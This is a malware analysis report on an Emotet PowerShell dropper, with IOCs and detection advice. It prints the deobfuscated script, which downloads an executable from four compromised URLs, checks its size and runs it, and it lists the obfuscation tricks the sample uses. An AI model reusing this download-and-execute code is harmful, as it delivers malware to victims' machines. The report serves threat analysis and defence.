# Analysis: Real-World Emotet Downloader (Epoch 2)
**Date:** 2026-01-04
**Analyst:** Nedheesh Hasija
**Artifact:** Emotet PowerShell Dropper

## Executive Summary

An obfuscated PowerShell script was identified attempting to download the Emotet Trojan from multiple compromised WordPress sites. The script uses multiple evasion techniques (backticks, concatenation) to bypass signature-based detection.

### Analyst-Deobfuscated Script (Normalized)
```powershell
$MalwareName = '937';
$FilePath = $env:userprofile + '\' + $MalwareName + '.exe';
$WebClient = New-Object Net.WebClient;
$Urls='http://ahc[.]mrbdev[.]com/wp-admin/qp0/*http://e-twow[.]be/verde/in6k/*https://magnificentpakistan[.]com/wp-includes/ha5j0b1/*http://siwakuposo[.]com/'.split('*');
foreach($Link in $Urls){
    try{
        $WebClient."DownloadFile"($Link, $FilePath);
        if ((&('Get-Item') $FilePath)."Length" -ge 29936) {
            [Diagnostics.Process]::"start"($FilePath);
            break;
        }
    }
    catch{}
}
```



**Artifact:** PowerShell Dropper (Source: Emotet Campaign)
**Techniques Observed:**

1. Garbage variable assignments were used to obfuscate the code.
2. The ``` ` backtick ``` character was used to obfuscate strings.
3. ```+``` operator was used to concatenate fragmented strings.
4. URLs were joined with ```*``` asterisk character to evade weak URL regex security controls.
5. The ```char``` conversion function was used to obfuscate the ASCII value of ```*``` asterisk character.
6. Randomized case (e.g. NeT.WeBCLiEnT) was used to bypass weak security controls.
7. The [Process.Start](https://learn.microsoft.com/en-us/dotnet/api/system.diagnostics.process.start?view=netframework-4.8) method was used to execute the downloaded file

## Network Obfuscation

Following are the 4 defanged URLs the malware is trying to contact 

* hxxp[://]ahc[.]mrbdev[.]com/wp-admin/qp0/
* hxxp[://]e-twow[.]be/verde/in6k/
* hxxps[://]magnificentpakistan[.]com/wp-includes/ha5j0b1/
* hxxp[://]siwakuposo[.]com/

## Host Obfuscation 

The full path of where the malware tries to save itself is ```C:\\Users\<username>\937.exe``` 

## Logic Check

There is an ```IF``` condition in the code where the adversaries were checking whether the downloaded file has a file size greater than or equal to 29936 bytes before executing. The reasoning is probably to check whether the file is actually downloaded

# 4. Key Takeaways

- The file size check (`>= 29936 bytes`) before execution is an anti-sandbox technique — lightweight sandbox environments that return empty HTTP responses will not trigger execution, making dynamic analysis unreliable for this sample.
- The use of multiple fallback URLs across different compromised WordPress sites means blocking one domain is insufficient — all four IOCs should be blocked at the proxy/firewall level simultaneously.
- Detection should target the behavioural pattern rather than the obfuscated strings: `Net.WebClient` instantiation followed by `DownloadFile` and immediate `Process.Start` in the same PowerShell session is a high-confidence indicator regardless of obfuscation variant.

**IOCs (Defanged):**
- `hxxp[://]ahc[.]mrbdev[.]com/wp-admin/qp0/`
- `hxxp[://]e-twow[.]be/verde/in6k/`
- `hxxps[://]magnificentpakistan[.]com/wp-includes/ha5j0b1/`
- `hxxp[://]siwakuposo[.]com/`
- Drop path: `C:\Users\<username>\937.exe`